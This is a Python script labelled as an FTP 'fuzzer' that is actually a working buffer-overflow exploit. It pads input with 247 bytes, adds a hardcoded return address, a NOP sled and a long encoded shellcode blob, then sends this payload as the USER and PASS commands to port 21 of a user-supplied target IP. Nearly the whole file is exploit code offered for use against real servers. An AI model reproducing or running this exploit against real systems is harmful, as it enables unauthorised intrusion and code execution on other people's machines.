import socket
from ipaddress import ip_address

buffer = []

counter = 100

shellcode = ("\xba\x3e\x9a\x17\x22\xdb\xcd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
                                     "\x52\x31\x55\x12\x83\xed\xfc\x03\x6b\x94\xf5\xd7\x6f\x40\x7b"
                                     "\x17\x8f\x91\x1c\x91\x6a\xa0\x1c\xc5\xff\x93\xac\x8d\xad\x1f"
                                     "\x46\xc3\x45\xab\x2a\xcc\x6a\x1c\x80\x2a\x45\x9d\xb9\x0f\xc4"
                                     "\x1d\xc0\x43\x26\x1f\x0b\x96\x27\x58\x76\x5b\x75\x31\xfc\xce"
                                     "\x69\x36\x48\xd3\x02\x04\x5c\x53\xf7\xdd\x5f\x72\xa6\x56\x06"
                                     "\x54\x49\xba\x32\xdd\x51\xdf\x7f\x97\xea\x2b\x0b\x26\x3a\x62"
                                     "\xf4\x85\x03\x4a\x07\xd7\x44\x6d\xf8\xa2\xbc\x8d\x85\xb4\x7b"
                                     "\xef\x51\x30\x9f\x57\x11\xe2\x7b\x69\xf6\x75\x08\x65\xb3\xf2"
                                     "\x56\x6a\x42\xd6\xed\x96\xcf\xd9\x21\x1f\x8b\xfd\xe5\x7b\x4f"
                                     "\x9f\xbc\x21\x3e\xa0\xde\x89\x9f\x04\x95\x24\xcb\x34\xf4\x20"
                                     "\x38\x75\x06\xb1\x56\x0e\x75\x83\xf9\xa4\x11\xaf\x72\x63\xe6"
                                     "\xd0\xa8\xd3\x78\x2f\x53\x24\x51\xf4\x07\x74\xc9\xdd\x27\x1f"
                                     "\x09\xe1\xfd\xb0\x59\x4d\xae\x70\x09\x2d\x1e\x19\x43\xa2\x41"
                                     "\x39\x6c\x68\xea\xd0\x97\xfb\xd5\x8d\x96\xdc\xbd\xcf\x98\x23"
                                     "\x85\x59\x7e\x49\xe9\x0f\x29\xe6\x90\x15\xa1\x97\x5d\x80\xcc"
                                     "\x98\xd6\x27\x31\x56\x1f\x4d\x21\x0f\xef\x18\x1b\x86\xf0\xb6"
                                     "\x33\x44\x62\x5d\xc3\x03\x9f\xca\x94\x44\x51\x03\x70\x79\xc8"
                                     "\xbd\x66\x80\x8c\x86\x22\x5f\x6d\x08\xab\x12\xc9\x2e\xbb\xea"
                                     "\xd2\x6a\xef\xa2\x84\x24\x59\x05\x7f\x87\x33\xdf\x2c\x41\xd3"
                                     "\xa6\x1e\x52\xa5\xa6\x4a\x24\x49\x16\x23\x71\x76\x97\xa3\x75"
                                     "\x0f\xc5\x53\x79\xda\x4d\x63\x30\x46\xe7\xec\x9d\x13\xb5\x70"
                                     "\x1e\xce\xfa\x8c\x9d\xfa\x82\x6a\xbd\x8f\x87\x37\x79\x7c\xfa"
                                     "\x28\xec\x82\xa9\x49\x25")

string = 247 * "X" + "\x13\x4F\x87\x7C" + 20 * "\x90" + shellcode

buffer.append(string)


def check_ip(ip):
    try:
        ip_address(ip)
        print("[INFO] The ip is valid")
    except:
        print("[INFO] The ip is not valid")
        input()
        exit()

def check_ftp(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 21))
        return True
    except:
        return False


def attack(ip):
    for payload in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 21))

            buffszie = int(1024)

            print(f"{s.recv(buffszie)} received from the target")

            msg = "USER " + payload + "\r\n"

            s.send(msg.encode("utf-8"))
            print(f"{s.recv(buffszie)} received from the target")

            print("Fuzzing PASS")

            msg2 = "PASS " + payload + "\r\n"
            s.send(msg2.encode("utf-8"))
            print(f"{s.recv(buffszie)} received from the target")
            s.close()

        except:
            print(f"The target {ip}:21 is not vulnerable")


print(
                            """

                             _____              _               _____ _____ ____  
                            |  ___|   _ _______(_)_ __   __ _  |  ___|_   _|  _ \   ~>Fuzzing FTP<~
                            | |_ | | | |_  /_  / | '_ \ / _` | | |_    | | | |_) | ~~>Made by tfwcodes(github)<~~
                            |  _|| |_| |/ / / /| | | | | (_| | |  _|   | | |  __/ 
                            |_|   \__,_/___/___|_|_| |_|\__, | |_|     |_| |_|    
                                                        |___/                     


                            """
                        )
ip_target = input("[+] Enter the target ip: ")
check_ip(ip_target)
ftp_check = check_ftp(ip_target)
if ftp_check:
    print("[INFO] FTP is enabled")
    attack(ip_target)
else:
    print("[INFO] FTP is disabled")
    input()
    exit()
